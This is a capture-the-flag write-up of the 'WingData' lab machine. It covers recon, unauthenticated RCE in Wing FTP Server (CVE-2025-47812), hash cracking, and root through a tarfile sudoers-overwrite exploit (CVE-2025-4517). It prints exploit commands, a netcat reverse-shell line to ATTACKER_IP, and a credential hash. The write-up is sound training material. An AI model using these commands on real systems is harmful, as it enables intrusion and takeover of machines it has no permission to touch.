# Room: WingData
Difficulty: Easy
## Recon:
I started scanning for open ports using nmap -sC -sV and found the following ports:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I added wingdata.htb to /etc/hosts.

``` bash
echo "TARGET_IP wingdata.htb" | sudo tee -a /etc/hosts
```
Upon navigating the web page, I found a client portal which has a subdirectory of ftp, and I added it again to /etc/hosts.

It leads to the login panel, and the version was Wing FTP Server v7.4.3. Upon searching, 
I found that the default credential was anonymous without a password. 
After accessing it, I did not have permission to upload.

## Vulnerabilty:

Doing basic research, I found that there was a vulnerability: CVE-2025-47812 (Unauthenticated RCE). This vulnerability has improper NULL byte handling in the /loginok.html endpoint, allowing unauthenticated RCE via Lua injection.

I exploited it using exploit-db:
https://www.exploit-db.com/exploits/52347

1st attempt:
``` bash
python3 52347.py -u http://ftp.wingdata.htb/ -c id
```
Response:
``` bash
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

2nd attempt:
``` bash
python3 52347.py -u http://ftp.wingdata.htb/ -c "cat /etc/passwd"
```
Response:
``` bash
root:x:0:0:root:/root:/bin/bash
...
wacky:x:1001:1001::/home/wacky:/bin/bash
...
```
3rd attempt:
I started my netcat listner:
``` bash
nc -lvnp 4444
```
Then:
``` bash
python3 52347.py -u http://ftp.wingdata.htb/ -c "busybox nc ATTACKER_IP 4444 -e bash"
```
Now I am wingftp.

## Privilege Escalation:

On /opt/wftpserver/Data/1/users/, we can find 5 XML files, and there is wacky.xml, which is a valid user. I grabbed the hash:
``` plaintext
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```
I added it to wacky.txt:
``` bash
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```
I added WingFTP because of the hash format of WingFTP.

I ran hashcat using -m 1410 and got the password for user wacky:
``` bash
!£7****
```
Now I am wacky.

## Root Access:
Doing sudo -l
``` bash
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
Inside /opt/backup_clients/restore_backup_clients.py, I found a vulnerable line of code:
``` bash
try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
```
Checking the python version:
``` bash
Python 3.12.3
```
Doing some research, I found that this Python version (3.12.3) has CVE-2025-4517.

Using a public exploit, I found this working payload:
https://github.com/AzureADTrent/CVE-2025-4517-POC

After running:
``` bash
╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit                         ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝
    
[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================

[?] Spawn root shell now? (y/n): y

[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/tmp#
```

## Exploit Explanation:
The exploit creates a malicious tar archive that uses symlinks and hardlinks to manipulate file paths during extraction. 
When the vulnerable script extracts the tar as root, it is tricked into modifying /etc/sudoers. 
This grants the user full passwordless sudo access, allowing them to become root.


